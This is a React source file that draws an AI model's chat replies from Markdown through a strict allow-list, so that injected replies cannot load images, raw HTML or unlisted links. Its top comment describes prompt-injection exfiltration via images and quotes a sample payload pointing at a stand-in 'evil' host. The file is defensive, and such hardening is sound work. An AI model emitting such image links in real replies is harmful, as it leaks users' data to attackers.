import { Fragment, memo, useMemo, useState, type ReactNode } from 'react'
import NextLink from 'next/link'
import { Box, Button, Link, Text } from '@chakra-ui/react'
import { unified } from 'unified'
import remarkParse from 'remark-parse'
import remarkGfm from 'remark-gfm'
import { MONO } from '../shell/ui'
import { useScrollRegion } from '../shell/scrollRegion'
import { copyText } from '../../MDX/clipboard'
import type { MdNode, MdRoot } from '../editor/markdown/mdast'
import { externalUrl, liveHref } from './chatLinks'
import { CHAT_MD_COPY } from './copy'

/**
 * A model's reply as the owner reads it (design §8.3, non-negotiable).
 *
 * remark-parse + remark-gfm read the Markdown; then an ALLOW-LIST mapping of
 * the syntax tree to React elements draws it: paragraphs, lists, emphasis,
 * strong, strikethrough, inline code, code blocks, headings, blockquotes,
 * rules and plain tables. Nothing else is drawn as markup:
 *
 *   - no images: an image is the words "[image not loaded]" and its address,
 *     so a reply cannot make the browser fetch anything (EchoLeak-style
 *     exfiltration: an injected ![](https://evil/?d=…) loads on render);
 *   - no raw HTML: an `html` node is its own source text, never markup, and
 *     nothing here sets inner HTML;
 *   - references ([x][1], ![x][1], footnotes) and their definitions are not
 *     resolved: the source text, as written;
 *   - a same-site link is live only on the allow-list of chatLinks (public
 *     pages, the change pages, the editors; never /api/, /oauth/ or
 *     /ai/review/), every web address is shown in full as text with a Copy
 *     button, and anything else is its source text.
 *
 * Any node type the mapping does not know is drawn as its source text. Very
 * deep nesting and very long replies fall back to plain text, so a hostile
 * provider cannot stall the page.
 */

/** Past this, a reply is shown as plain text (no parse): it is far longer than any answer meant to be read. */
export const CHAT_MD_MAX = 100_000
/** Nesting past this is drawn as source text (React's own recursion stays shallow). */
const MAX_DEPTH = 24

const parser = unified().use(remarkParse).use(remarkGfm).freeze()

export function parseChat(text: string): MdRoot {
  return parser.parse(text) as unknown as MdRoot
}

/** `flow`: the node sits where blocks go (the reply, a quote, a list item), not inside a line. */
type Ctx = { source: string; depth: number; key: string; flow: boolean }

const FLOW_PARENTS = new Set(['root', 'blockquote', 'listItem', 'footnoteDefinition'])

/** The exact source text of a node (references, definitions, unknown nodes). */
function sourceOf(node: MdNode, source: string): string {
  const start = node.position?.start?.offset
  const end = node.position?.end?.offset
  if (typeof start === 'number' && typeof end === 'number' && end >= start) return source.slice(start, end)
  return typeof node.value === 'string' ? node.value : ''
}

/** The plain text of a node's children (for comparing a link's words with its address). */
function plainText(node: MdNode): string {
  if (typeof node.value === 'string') return node.value
  return (node.children ?? []).map(plainText).join('')
}

function CopyAddress({ url }: { url: string }) {
  const [state, setState] = useState<'idle' | 'copied' | 'failed'>('idle')
  return (
    <Button
      size="xs"
      variant="ghost"
      fontFamily={MONO}
      fontSize="10px"
      fontWeight={500}
      h="20px"
      minW={0}
      px={1.5}
      ml={1}
      verticalAlign="baseline"
      color="page.fg-secondary"
      _hover={{ color: 'page.fg', bg: 'page.bg-overlay' }}
      aria-label={state === 'copied' ? CHAT_MD_COPY.copiedAddress(url) : CHAT_MD_COPY.copyAddress(url)}
      onClick={async () => setState((await copyText(url)) ? 'copied' : 'failed')}
    >
      {state === 'copied' ? CHAT_MD_COPY.copied : state === 'failed' ? CHAT_MD_COPY.copyFailed : CHAT_MD_COPY.copy}
    </Button>
  )
}

/** A web address: shown in full as text, never a link, with Copy. */
function Address({ url }: { url: string }) {
  return (
    <Box as="span" data-inert-url="">
      <Text as="span" fontFamily={MONO} fontSize="0.86em" wordBreak="break-all" color="page.fg-secondary">
        {url}
      </Text>
      <CopyAddress url={url} />
    </Box>
  )
}

function ChatTable({ node, ctx }: { node: MdNode; ctx: Ctx }) {
  const [ref, region] = useScrollRegion(CHAT_MD_COPY.table)
  const rows = node.children ?? []
  const align = node.align ?? []
  const cell = (c: MdNode, i: number, head: boolean, key: string) => (
    <Box
      as={head ? 'th' : 'td'}
      key={key}
      scope={head ? 'col' : undefined}
      textAlign={align[i] ?? 'left'}
      px={3}
      py={1.5}
      borderBottom="1px solid"
      borderColor="page.border"
      fontWeight={head ? 600 : 400}
      verticalAlign="top"
    >
      {children(c, { ...ctx, key })}
    </Box>
  )
  return (
    <Box ref={ref} {...region} overflowX="auto" my={3} border="1px solid" borderColor="page.border" borderRadius="md" _focusVisible={{ outline: '2px solid', outlineColor: 'accent.500', outlineOffset: '2px' }}>
      <Box as="table" w="100%" fontSize="sm" sx={{ borderCollapse: 'collapse' }}>
        {rows.length ? (
          <Box as="thead" bg="page.bg-elevated">
            <Box as="tr">{(rows[0].children ?? []).map((c, i) => cell(c, i, true, `${ctx.key}.h${i}`))}</Box>
          </Box>
        ) : null}
        <Box as="tbody">
          {rows.slice(1).map((r, ri) => (
            <Box as="tr" key={`${ctx.key}.r${ri}`}>
              {(r.children ?? []).map((c, i) => cell(c, i, false, `${ctx.key}.r${ri}.${i}`))}
            </Box>
          ))}
        </Box>
      </Box>
    </Box>
  )
}

function children(node: MdNode, ctx: Ctx): ReactNode {
  const flow = FLOW_PARENTS.has(node.type)
  return (node.children ?? []).map((c, i) => renderNode(c, { ...ctx, depth: ctx.depth + 1, key: `${ctx.key}.${i}`, flow }))
}

const HEADING_TAG = ['h3', 'h3', 'h4', 'h5', 'h6', 'h6', 'h6'] as const
const HEADING_SIZE = ['md', 'md', 'sm', 'sm', 'sm', 'sm', 'sm'] as const

function renderNode(node: MdNode, ctx: Ctx): ReactNode {
  const { key } = ctx
  if (ctx.depth > MAX_DEPTH) {
    return (
      <Text key={key} as="span" whiteSpace="pre-wrap">
        {sourceOf(node, ctx.source)}
      </Text>
    )
  }
  switch (node.type) {
    case 'root':
      return <Fragment key={key}>{children(node, ctx)}</Fragment>
    case 'text':
      return <Fragment key={key}>{node.value ?? ''}</Fragment>
    case 'paragraph':
      return (
        <Text key={key} as="p" mt={3} _first={{ mt: 0 }}>
          {children(node, ctx)}
        </Text>
      )
    case 'heading': {
      const d = Math.min(6, Math.max(1, node.depth ?? 1))
      return (
        <Text key={key} as={HEADING_TAG[d]} fontSize={HEADING_SIZE[d]} fontWeight={600} letterSpacing="-0.01em" mt={5} mb={1} _first={{ mt: 0 }}>
          {children(node, ctx)}
        </Text>
      )
    }
    case 'emphasis':
      return <em key={key}>{children(node, ctx)}</em>
    case 'strong':
      return <strong key={key}>{children(node, ctx)}</strong>
    case 'delete':
      return <del key={key}>{children(node, ctx)}</del>
    case 'inlineCode':
      return (
        <Box key={key} as="code" fontFamily={MONO} fontSize="0.86em" bg="page.bg-elevated" border="1px solid" borderColor="page.border" borderRadius="sm" px={1} py="1px" wordBreak="break-word">
          {node.value ?? ''}
        </Box>
      )
    case 'code':
      return (
        <Box
          key={key}
          as="pre"
          my={3}
          p={3}
          fontFamily={MONO}
          fontSize="12.5px"
          lineHeight="1.6"
          bg="page.bg-elevated"
          border="1px solid"
          borderColor="page.border"
          borderRadius="md"
          whiteSpace="pre-wrap"
          wordBreak="break-word"
        >
          <code>{node.value ?? ''}</code>
        </Box>
      )
    case 'blockquote':
      return (
        <Box key={key} as="blockquote" my={3} pl={3} borderLeft="2px solid" borderColor="page.border-strong" color="page.fg-secondary">
          {children(node, ctx)}
        </Box>
      )
    case 'list': {
      const ordered = !!node.ordered
      return (
        <Box
          key={key}
          as={ordered ? 'ol' : 'ul'}
          {...(ordered && typeof node.start === 'number' && node.start !== 1 ? { start: node.start } : {})}
          my={3}
          pl={6}
          sx={{ listStyleType: ordered ? 'decimal' : 'disc', '& > li + li': { mt: 1 } }}
        >
          {children(node, ctx)}
        </Box>
      )
    }
    case 'listItem':
      return (
        <Box key={key} as="li" sx={{ '& > p': { mt: 0 }, '& > p + p': { mt: 2 } }}>
          {typeof node.checked === 'boolean' ? (
            <Text as="span" fontFamily={MONO} mr={1.5} aria-label={node.checked ? CHAT_MD_COPY.done : CHAT_MD_COPY.notDone}>
              {node.checked ? '☑' : '☐'}
            </Text>
          ) : null}
          {children(node, ctx)}
        </Box>
      )
    case 'thematicBreak':
      return <Box key={key} as="hr" my={4} borderColor="page.border" />
    case 'break':
      return <br key={key} />
    case 'table':
      return <ChatTable key={key} node={node} ctx={ctx} />
    case 'link': {
      const href = liveHref(node.url)
      if (href) {
        return (
          <Link key={key} as={NextLink} href={href} color="accent.text" textDecoration="underline" textUnderlineOffset="2px">
            {children(node, ctx)}
          </Link>
        )
      }
      const url = externalUrl(node.url)
      if (url) {
        const words = plainText(node)
        // An autolink (or words that are the address): the address once.
        if (words === url || words === url.replace(/^mailto:/, '')) return <Address key={key} url={url} />
        return (
          <Fragment key={key}>
            {children(node, ctx)} <Address url={url} />
          </Fragment>
        )
      }
      return <Fragment key={key}>{sourceOf(node, ctx.source)}</Fragment>
    }
    case 'image': {
      const url = typeof node.url === 'string' ? node.url : ''
      return (
        <Text key={key} as="span" fontFamily={MONO} fontSize="0.86em" color="page.fg-secondary" wordBreak="break-all" data-image-not-loaded="">
          {CHAT_MD_COPY.imageNotLoaded} {url}
        </Text>
      )
    }
    case 'imageReference':
      return (
        <Text key={key} as="span" fontFamily={MONO} fontSize="0.86em" color="page.fg-secondary" wordBreak="break-all" data-image-not-loaded="">
          {CHAT_MD_COPY.imageNotLoaded} {sourceOf(node, ctx.source)}
        </Text>
      )
    case 'html':
      // Raw HTML is text: the reader sees exactly what the model wrote (a block of it as its own paragraph).
      return ctx.flow ? (
        <Text key={key} as="p" mt={3} _first={{ mt: 0 }} whiteSpace="pre-wrap">
          {node.value ?? ''}
        </Text>
      ) : (
        <Fragment key={key}>{node.value ?? ''}</Fragment>
      )
    case 'definition':
    case 'footnoteDefinition':
      return (
        <Text key={key} as="p" mt={3} _first={{ mt: 0 }} fontFamily={MONO} fontSize="0.86em" color="page.fg-secondary" wordBreak="break-all" whiteSpace="pre-wrap">
          {sourceOf(node, ctx.source)}
        </Text>
      )
    default:
      // linkReference, footnoteReference and anything the mapping does not know: the source, as written.
      return <Fragment key={key}>{sourceOf(node, ctx.source)}</Fragment>
  }
}

/** Draw a reply's Markdown by the allow-list above. Pure for a given text (tests render it on the server). */
export function renderChatMarkdown(text: string): ReactNode {
  if (text.length > CHAT_MD_MAX) {
    return (
      <Text as="p" whiteSpace="pre-wrap" wordBreak="break-word">
        {text}
      </Text>
    )
  }
  let tree: MdRoot
  try {
    tree = parseChat(text)
  } catch {
    return (
      <Text as="p" whiteSpace="pre-wrap" wordBreak="break-word">
        {text}
      </Text>
    )
  }
  return renderNode(tree, { source: text, depth: 0, key: 'm', flow: true })
}

/**
 * A reply, memoised on its text: a finished turn parses once; only the turn
 * being written re-parses as its text grows.
 */
function ChatMarkdown({ text, lang }: { text: string; lang?: string }) {
  const out = useMemo(() => renderChatMarkdown(text), [text])
  return (
    <Box lang={lang} fontSize="15px" lineHeight="1.65" color="page.fg" wordBreak="break-word" data-chat-markdown="">
      {out}
    </Box>
  )
}

export default memo(ChatMarkdown)
